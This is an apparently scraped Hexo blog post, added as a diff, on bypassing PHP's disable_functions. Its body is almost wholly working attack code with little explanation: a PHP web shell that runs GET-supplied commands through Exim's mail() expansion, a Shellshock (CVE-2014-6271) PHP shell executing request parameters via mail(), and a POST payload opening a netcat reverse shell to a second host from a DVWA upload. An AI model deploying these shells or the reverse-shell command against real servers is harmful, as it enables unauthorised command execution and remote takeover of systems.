@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>php disable_function bypass | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php disable_function bypass">
+<meta property="og:url" content="http://yoursite.com/2018/03/01/php-disable-function-bypass/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+<meta property="og:updated_time" content="2018-03-01T06:34:08.693Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php disable_function bypass">
+<meta name="twitter:description" content="1https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md Exim_mail_bypass_disable_functionhttp://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-php-disable-function-bypass" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/01/php-disable-function-bypass/" class="article-date">
+  <time datetime="2018-03-01T06:33:05.000Z" itemprop="datePublished">2018-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      php disable_function bypass
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/bypass_function.md</span><br></pre></td></tr></table></figure>
+<h2 id="Exim-mail-bypass-disable-function"><a href="#Exim-mail-bypass-disable-function" class="headerlink" title="Exim_mail_bypass_disable_function"></a>Exim_mail_bypass_disable_function</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/Exim_mail_bypass_disable_function.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数:mail,file_put_contents,file_get_contents</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$c = @$_GET[&apos;lemon&apos;];</span><br><span class="line">$result_file = &quot;/tmp/test.txt&quot;;</span><br><span class="line">$tmp_file = &apos;/tmp/aaaaaaaaaaa.sh&apos;;</span><br><span class="line">$command = $c . &apos;&gt;&apos; . $result_file;</span><br><span class="line">file_put_contents($tmp_file, $command);</span><br><span class="line">$payload = &quot;-be \$&#123;run&#123;/bin/bash\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;/tmp/aaaaaaaaaaa.sh&#125;&#123;ok&#125;&#123;error&#125;&#125;&quot;;</span><br><span class="line">mail(&quot;a@localhost&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;, $payload);</span><br><span class="line">echo file_get_contents($result_file);</span><br><span class="line">@unlink($tmp_file);</span><br><span class="line">@unlink($result_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Bash-破壳漏洞-CVE-2014-6271"><a href="#Bash-破壳漏洞-CVE-2014-6271" class="headerlink" title="Bash 破壳漏洞 CVE-2014-6271"></a>Bash 破壳漏洞 CVE-2014-6271</h2><p><a href="http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/CVE-2014-6271_shellshock.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php脚本绕过函数禁用，实现系统命令执行</span><br><span class="line">http://192.168.101.128/dvwa/hackable/uploads/a.php</span><br><span class="line">post：</span><br><span class="line">cmd=/bin/bash -c &apos;nc -e /bin/sh 192.168.101.129 12666&apos;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&apos;disable_functions&apos;).&quot;\n&quot;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @ mail.c:283</span><br><span class="line">   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class="line">     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);</span><br><span class="line">     putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class="line">     // In Safe Mode, the user may only alter environment variables whose names</span><br><span class="line">     // begin with the prefixes supplied by this directive.</span><br><span class="line">     // By default, users will only be able to set environment variables that</span><br><span class="line">     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,</span><br><span class="line">     // PHP will let the user modify ANY environment variable!</span><br><span class="line">     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&apos;t actually send any mail</span><br><span class="line">   &#125;</span><br><span class="line">   else return &quot;Not vuln (not bash)&quot;;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   if($output != &quot;&quot;) return $output;</span><br><span class="line">   else return &quot;No output, or not vuln.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo shellshock($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/03/01/php-disable-function-bypass/" data-id="cjf199x5m0001wsazs2jgxyyn" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/01/DNS劫持修改页面/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DNS劫持修改页面
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/01/python识别验证码/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">python识别验证码</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns劫持/">dns劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/proxy/">proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/dns劫持/" style="font-size: 10px;">dns劫持</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/01/lfi-phpinfo/">lfi-phpinfo</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/windows日志清除/">windows日志清除</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/reGeorg-proxychains4-F-NAScan/">reGeorg+proxychains4+F-NAScan</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/DNS劫持修改页面/">DNS劫持修改页面</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/01/php-disable-function-bypass/">php disable_function bypass</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
